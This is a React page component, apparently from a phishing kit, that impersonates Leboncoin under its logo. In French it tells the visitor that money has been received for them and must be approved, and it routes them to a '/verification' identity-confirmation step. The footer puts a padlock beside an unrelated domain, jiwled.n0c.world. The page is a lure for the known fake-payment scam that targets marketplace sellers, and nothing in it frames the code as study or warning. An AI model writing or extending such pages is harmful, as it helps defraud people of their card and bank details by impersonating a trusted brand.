
import React from 'react';
import { useNavigate } from 'react-router-dom';
import { Button } from '@/components/ui/button';
import { Card, CardContent } from '@/components/ui/card';
import { LeboncoinLogo } from '@/components/LeboncoinLogo';
import { Check, ChevronRight } from 'lucide-react';
import { ProgressSteps } from '@/components/ProgressSteps';

const steps = [
  { name: 'Confirm', status: 'complete' as const },
  { name: 'Checkpoint', status: 'complete' as const },
  { name: 'Verify', status: 'current' as const },
  { name: 'Complete', status: 'upcoming' as const },
];

export default function LeboncoinTransaction() {
  const navigate = useNavigate();

  const handleContinue = () => {
    navigate('/verification');
  };

  return (
    <div className="min-h-screen flex flex-col bg-gray-50">
      <header className="bg-white border-b py-4 px-4">
        <div className="container mx-auto flex justify-center">
          <LeboncoinLogo size="lg" />
        </div>
      </header>
      
      <div className="container mx-auto px-4 py-8 flex-1 flex flex-col items-center">
        <div className="w-full max-w-md mb-8">
          <ProgressSteps steps={steps} />
        </div>
        
        <Card className="w-full max-w-md">
          <CardContent className="pt-6">
            <div className="text-center space-y-6">
              <div className="flex justify-center mb-4">
                <div className="p-2 rounded-full bg-orange-100">
                  <div className="h-16 w-16 rounded-full flex items-center justify-center">
                    <Check className="h-8 w-8 text-orange-500" />
                  </div>
                </div>
              </div>
              
              <h2 className="text-2xl font-semibold">Vous avez reçu de l'argent aujourd'hui</h2>
              
              <div className="flex justify-center">
                <div className="flex items-center justify-center w-12 h-12 rounded-full bg-orange-100">
                  <Check className="h-6 w-6 text-orange-500" />
                </div>
              </div>
              
              <p className="text-base text-gray-700">
                Pour approuver la transaction suivez utilisez le bouton-ci dessous et suivez les instructions. Pour lutter contre les transactions frauduleuse, une confirmation d'identité peut etre requise
              </p>
              
              <div className="space-y-4 mt-4">
                <h3 className="text-base font-medium">Voici les étapes à suivre:</h3>
                
                <div className="flex items-start gap-3">
                  <ChevronRight className="h-5 w-5 text-orange-500 flex-shrink-0 mt-0.5" />
                  <p className="text-left">Cliquez sur continuer pour commencer.</p>
                </div>
                
                <div className="flex items-start gap-3">
                  <ChevronRight className="h-5 w-5 text-orange-500 flex-shrink-0 mt-0.5" />
                  <p className="text-left">Confirmez votre identité.</p>
                </div>
                
                <div className="flex items-start gap-3">
                  <ChevronRight className="h-5 w-5 text-orange-500 flex-shrink-0 mt-0.5" />
                  <p className="text-left">Recevez votre paiement sur votre compte.</p>
                </div>
              </div>
            </div>
            
            <div className="mt-8">
              <Button 
                onClick={handleContinue}
                className="w-full bg-orange-500 hover:bg-orange-600 text-white"
              >
                Continuer
              </Button>
            </div>
          </CardContent>
        </Card>
      </div>
      
      <footer className="py-4 border-t text-center text-xs text-gray-500">
        <p>🔒 jiwled.n0c.world</p>
      </footer>
    </div>
  );
}
